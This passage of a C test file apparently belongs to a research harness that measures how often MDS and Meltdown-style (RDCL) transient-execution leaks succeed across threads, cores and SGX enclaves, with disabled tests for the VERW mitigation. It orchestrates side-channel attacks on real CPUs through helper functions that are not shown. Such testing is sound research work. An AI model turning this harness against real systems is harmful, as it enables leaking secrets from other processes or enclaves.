    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region same_thread_mds_sgx_is_10_percent_effective

/**
 * @brief Test if same_thread_mds_sgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_mds_sgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(mds, same_thread_mds_sgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_MDS;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x41;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_mds_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_mds_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_mds_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_mds_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_mds_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_mds_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_mds_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_mds_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_filling_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_mds_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_mds_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_mds_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_mds_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_mds_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(mds, cross_thread_mds_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_MDS;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_mds_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_mds_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    (void) arg; /** bypass the warning about unsed parameter */

    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_mds_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if corss_thread_mds_ecall is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_mds_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_mds_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_mds_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(mds, cross_thread_mds_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_MDS;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_mds_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_mds_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_filling_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_mds_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_mds_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_mds_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_mds_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_mds_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(mds, cross_core_mds_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_MDS;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_mds_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_mds_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_mds_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    (void) arg; /** bypass the warning about unsed parameter */

    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_mds_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if corss_thread_mds_ecall is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_mds_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_mds_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_mds_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(mds, cross_core_mds_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_MDS;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_filling_buffer.value = 0x1;
    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    assign_enclyser_buffer(&app_filling_buffer);

    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_mds_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma endregion

// #pragma region verw

// TestSuite(verw, .init = construct_app_environment, .fini = destruct_app_environment);

// #pragma region verw_against_same_thread_taa_nosgx_is_10_percent_effective

// /**
//  * @brief Test if verw is effective against same_thread_taa_nosgx with a successful rate above 90% for all offset.
//  *
//  * @return int 0 if passed, -1 if failed.
//  */
// int test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective(void)
// {
//     int i, offset, allowance;

//     allowance = 0;
//     for (offset = 0; offset < 64; offset++)
//     {
//         app_attack_spec.offset = offset;
//         for (i = 0; i < REPETITION_TIME; i++)
//         {
//             flush_enclyser_buffer(&app_encoding_buffer);
//             fill_lfb(app_filling_sequence, &app_filling_buffer);
//             clear_lfb(app_clearing_sequence, &app_clearing_buffer);
//             attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
//             reload(&app_encoding_buffer, &app_printing_buffer);
//         }
//         if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] < 10 || allowance--))
//         {
//             // INFO("offset: 0x%x", offset);
//             // print(&app_printing_buffer, 0);
//             return -1;
//         }
//         reset(&app_printing_buffer);
//     }
//     return 0;
// }

// Test(verw, verw_against_same_thread_taa_nosgx_is_10_percent_effective, .disabled = true)
// {
//     app_attack_spec.major = ATTACK_MAJOR_TAA;
//     app_attack_spec.minor = ATTACK_MINOR_STABLE;

//     app_filling_buffer.value = 0x1;
//     app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
//     assign_enclyser_buffer(&app_filling_buffer);

//     app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
//     app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
//     assign_enclyser_buffer(&app_attaking_buffer);

//     app_clearing_sequence = CLEARING_SEQUENCE_VERW;

//     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
//     cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

//     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
//     cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

//     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
//     cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

//     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
//     cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

//     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
//     cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

//     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
//     cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
// }

// #pragma endregion

// #pragma region verw_against_same_thread_mds_nosgx_is_10_percent_effective

// /**
//  * @brief Test if verw is effective against same_thread_mds_nosgx with a successful rate above 90% for all offset.
//  *
//  * @return int 0 if passed, -1 if failed.
//  */
// int test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective(void)
// {
//     int i, offset, allowance;

//     allowance = 32;
//     for (offset = 0; offset < 64; offset++)
//     {
//         app_attack_spec.offset = offset;
//         for (i = 0; i < REPETITION_TIME; i++)
//         {
//             flush_enclyser_buffer(&app_encoding_buffer);
//             fill_lfb(app_filling_sequence, &app_filling_buffer);
//             clear_lfb(app_clearing_sequence, &app_clearing_buffer);
//             attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
//             reload(&app_encoding_buffer, &app_printing_buffer);
//         }
//         if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] < 10 || allowance--))
//         {
//             // INFO("offset: 0x%x", offset);
//             // print(&app_printing_buffer, 0);
//             return -1;
//         }
//         reset(&app_printing_buffer);
//     }
//     return 0;
// }

// Test(verw, verw_against_same_thread_mds_nosgx_is_10_percent_effective, .disabled = true)
// {
//     app_attack_spec.major = ATTACK_MAJOR_MDS;
//     app_attack_spec.minor = ATTACK_MINOR_STABLE;

//     app_filling_buffer.value = 0x1;
//     app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
//     assign_enclyser_buffer(&app_filling_buffer);

//     app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
//     app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
//     app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
//     assign_enclyser_buffer(&app_attaking_buffer);
//     cripple_enclyser_buffer(&app_attaking_buffer);

//     app_clearing_sequence = CLEARING_SEQUENCE_VERW;

//     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
//     cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

//     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
//     cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

//     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
//     cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

//     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
//     cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

//     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
//     cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

//     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
//     cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
// }

// #pragma endregion

// #pragma endregion

#pragma region rdcl

TestSuite(rdcl, .init = construct_app_environment, .fini = destruct_app_environment);

#pragma region same_thread_rdcl_nosgx_is_10_percent_effective

/**
 * @brief Test if same_thread_rdcl_nosgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_rdcl_nosgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            fill_lfb(app_filling_sequence, &app_attaking_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 10 || allowance--))
        {
            INFO("offset: 0x%x", offset);
            print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(rdcl, same_thread_rdcl_nosgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_RDCL;
    app_attack_spec.minor = ATTACK_MINOR_NO_TSX;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_SUPERVISOR;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    ecall_empty(global_eid);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_rdcl_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_rdcl_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_rdcl_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_rdcl_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_rdcl_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_rdcl_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region same_thread_rdcl_sgx_is_10_percent_effective

/**
 * @brief Test if same_thread_rdcl_sgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_rdcl_sgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

